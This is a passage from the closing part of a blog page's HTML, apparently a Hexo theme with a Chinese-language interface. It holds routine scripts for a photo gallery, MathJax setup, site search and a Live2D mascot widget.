                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
            'HTML-CSS': {
                matchFontHeight: false
            },
            SVG: {
                matchFontHeight: false
            },
            CommonHTML: {
                matchFontHeight: false
            },
            tex2jax: {
                inlineMath: [
                    ['$','$'],
                    ['\\(','\\)']
                ]
            }
        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener("DOMContentLoaded",function(){loadInsight({contentUrl:"/content.json"},{hint:"想要查找什么...",untitled:"(无标题)",posts:"文章",pages:"页面",categories:"分类",tags:"标签"})})</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":200,"height":400},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body></html>